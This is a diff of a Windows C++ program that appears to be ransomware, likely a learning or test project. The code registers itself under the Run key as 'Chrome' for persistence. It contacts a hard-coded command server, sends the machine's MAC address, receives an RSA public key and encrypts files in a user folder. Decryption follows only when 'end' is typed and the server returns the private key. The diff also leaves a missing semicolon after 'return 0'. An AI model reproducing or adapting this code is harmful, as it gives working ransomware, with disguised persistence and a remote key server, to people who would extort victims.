@@ -2,7 +2,6 @@
 
 #include <WinSock2.h>
 #include <windows.h>
-#include <ws2tcpip.h>
 #include <iostream>
 #include <vector>
 #include <openssl/applink.c>
@@ -13,6 +12,7 @@
 #include "rsa.hpp"
 #include "fileEnc.hpp"
 #include "internet.hpp"
+#include "registry.hpp"
 
 using namespace std;
 
@@ -22,100 +22,68 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
 #pragma comment(lib, "libssl.lib")
 #pragma comment(lib, "libcrypto.lib")
 HWND hEdit;
-const string SERVER_IP = "3.36.117.40";
-const int SERVER_PORT = 54000;
+
 #define IDC_MAIN_BUTTON	101			// Button identifier
 #define IDC_MAIN_EDIT	102			// Edit box identifier
-const wchar_t* regKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
-    // 레지스터리에 저장. 컴퓨터 부팅 시 실행될 수 있도록
-    // 실행할 프로그램의 경로
-    TCHAR programPath[MAX_PATH];
-    GetModuleFileName(NULL, programPath, MAX_PATH);
-
-
-    // 레지스트리에 등록
-    HKEY hKey;
-    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, regKeyPath, 0, KEY_SET_VALUE, &hKey);
-    if (result == ERROR_SUCCESS) {
-        result = RegSetValueEx(hKey, L"Chrome", 0, REG_SZ, (BYTE*)programPath, (DWORD)(lstrlen(programPath) + 1) * sizeof(TCHAR));
-        if (result == ERROR_SUCCESS) printf("Program added to startup\n");
-        else printf("Failed to add program to startup\n");
-        RegCloseKey(hKey);
-    }
-    else printf("Failed to open registry key\n");
-
-    // 소켓 초기화
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        std::cerr << "WSAStartup failed!" << std::endl;
-        return -1;
-    }
-    // 소켓 생성
-    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (clientSocket == INVALID_SOCKET) {
-        std::cerr << "Can't create a socket! Quitting" << std::endl;
-        WSACleanup();
-        return -2;
-    }
-    // 서버 연결
-    sockaddr_in hint;
-    hint.sin_family = AF_INET;
-    hint.sin_port = htons(SERVER_PORT);
-    inet_pton(AF_INET, SERVER_IP.c_str(), &hint.sin_addr);
-
-    int connectResult = connect(clientSocket, (sockaddr*)&hint, sizeof(hint));
-    if (connectResult == SOCKET_ERROR) {
-        std::cerr << "Can't connect to server! Quitting" << std::endl;
-        closesocket(clientSocket);
-        WSACleanup();
-        return -3;
-    }
-
-    // MAC 주소 전송
-    string wifiMacAddress = getMacAddress();
-    send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
+    // 레지스트리 키 등록
+    SaveReg();
 
     // start 인경우 -> 공개키 저장
-    send(clientSocket, "start", sizeof("start"), 0);
-
-    // 서버로부터 공개키 수신
-    unsigned char publicKeyBuf[294];
-    // TODO : 받아온 사이즈 중에서 CC 인 부분은 자를 수 있도록
-    int publicKeyLen = recv(clientSocket, reinterpret_cast<char*>(publicKeyBuf), 294, 0);
-    if (publicKeyLen <= 0) {
-        std::cerr << "Failed to receive public key from server! Quitting" << std::endl;
-        closesocket(clientSocket);
-        WSACleanup();
-        return -4;
-    }
-    WSACleanup();
-    closesocket(clientSocket);
-
-    HANDLE hFile = CreateFile(L"public_key.der", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        std::cerr << "Failed to create file." << std::endl;
-        return 0;
-    }
-    DWORD bytesWritten;
-    if (!WriteFile(hFile, publicKeyBuf, sizeof(publicKeyBuf), &bytesWritten, NULL)) {
-        std::cerr << "Failed to write to file." << std::endl;
-        CloseHandle(hFile);
-        return 0;
-    }
-    CloseHandle(hFile);
-
     string filename = "C:\\Users";
     string userName = getUserName();
     filename += "\\" + userName + "\\ransomeware_test_file";
 
-    RSA* pubKey = getPubKey();
-    EncryptDir(pubKey, filename);
-    RSA_free(pubKey);
+    WIN32_FIND_DATAA data;
+    HANDLE hFind = FindFirstFileA((filename + "\\dirkey.key").c_str(), &data);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        cout << "start";
+
+        // 소켓 생성
+        SOCKET clientSocket = StartSocket();
+
+        // MAC 주소 전송
+        string wifiMacAddress = getMacAddress();
+        send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
+
+        // 처음 파일 실행인 경우
+        cout << "Start! \n";
+        send(clientSocket, "start", sizeof("start"), 0);
+
+        // 서버로부터 공개키 수신
+        unsigned char publicKeyBuf[294];
+        int publicKeyLen = recv(clientSocket, reinterpret_cast<char*>(publicKeyBuf), 294, 0);
+        if (publicKeyLen <= 0) {
+            std::cerr << "Failed to receive public key from server! Quitting" << std::endl;
+            closesocket(clientSocket);
+            WSACleanup();
+            return -4;
+        }
+        WSACleanup();
+        closesocket(clientSocket);
+
+        HANDLE hFile = CreateFile(L"public_key.der", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            std::cerr << "Failed to create file." << std::endl;
+            return 0;
+        }
+        DWORD bytesWritten;
+        if (!WriteFile(hFile, publicKeyBuf, sizeof(publicKeyBuf), &bytesWritten, NULL)) {
+            std::cerr << "Failed to write to file." << std::endl;
+            CloseHandle(hFile);
+            return 0;
+        }
+        CloseHandle(hFile);
     
-    
+        RSA* pubKey = getPubKey();
+        EncryptDir(pubKey, filename);
+        RSA_free(pubKey);
+    }
+    FindClose(hFind);
+
     
 
 
@@ -179,9 +147,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
         DispatchMessage(&msg);
     }
 
-    return 0;
-
-
+    return 0
 }
 
 
@@ -191,7 +157,6 @@ Waits for user input and executes code depending on the action
 */
 LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
-
     switch (msg)
     {
         //Creates the text on screen by painting
@@ -279,41 +244,15 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
             std::string key(wkey.begin(), wkey.end());
 
             if (key == "end") {
-                // 소켓 초기화
-                WSADATA wsaData;
-                if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-                    std::cerr << "WSAStartup failed!" << std::endl;
-                    return -1;
-                }
+                
                 // 소켓 생성
-                SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-                if (clientSocket == INVALID_SOCKET) {
-                    std::cerr << "Can't create a socket! Quitting" << std::endl;
-                    WSACleanup();
-                    return -2;
-                }
-                // 서버 연결
-                sockaddr_in hint;
-                hint.sin_family = AF_INET;
-
-                hint.sin_port = htons(SERVER_PORT);
-                inet_pton(AF_INET, SERVER_IP.c_str(), &hint.sin_addr);
-
-                int connectResult = connect(clientSocket, (sockaddr*)&hint, sizeof(hint));
-                if (connectResult == SOCKET_ERROR) {
-                    std::cerr << "Can't connect to server! Quitting" << std::endl;
-                    closesocket(clientSocket);
-                    WSACleanup();
-                    return -3;
-                }
+                SOCKET clientSocket = StartSocket();
 
                 // MAC 주소 가져오기
                 string wifiMacAddress = getMacAddress();
+
                 // 서버로 MAC 주소 전송
                 send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
-
-                // start 인경우 -> 공개키 저장
-                // TOOD : end인 경우 -> 개인키 저장
                 send(clientSocket, "end", sizeof("end"), 0);
 
                 // 서버로부터 공개키 수신
@@ -332,12 +271,12 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 // 받아온 공개키 저장
                 HANDLE hFile = CreateFile(L"private_key.der", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                 if (hFile == INVALID_HANDLE_VALUE) {
-                    std::cerr << "Failed to create file." << std::endl;
+                    cerr << "Failed to create file." << endl;
                     return 0;
                 }
                 DWORD bytesWritten;
                 if (!WriteFile(hFile, privateKeyBuf, sizeof(privateKeyBuf), &bytesWritten, NULL)) {
-                    std::cerr << "Failed to write to file." << std::endl;
+                    cerr << "Failed to write to file." << endl;
                     CloseHandle(hFile);
                     return 0;
                 }
@@ -350,31 +289,7 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 RSA* priKey = getPriKey();
                 DecryptDir(priKey, filename);
                 RSA_free(priKey);
-
-
-                HKEY hKey;
-                LONG lResult;
-
-                // 레지스트리 키 열기
-                lResult = RegOpenKeyEx(HKEY_CURRENT_USER, regKeyPath, 0, KEY_SET_VALUE, &hKey);
-
-                if (lResult != ERROR_SUCCESS) {
-                    std::cerr << "Error opening registry key." << std::endl;
-                    return 1;
-                }
-
-                // 값 삭제
-                lResult = RegDeleteValue(hKey, L"Chrome");
-
-                if (lResult == ERROR_SUCCESS) {
-                    std::cout << "Value deleted successfully." << std::endl;
-                }
-                else {
-                    std::cerr << "Error deleting value." << std::endl;
-                }
-
-                // 레지스트리 키 닫기
-                RegCloseKey(hKey);
+                DeleteReg();
 
                 return DefWindowProc(hWnd, msg, wParam, lParam);
             }
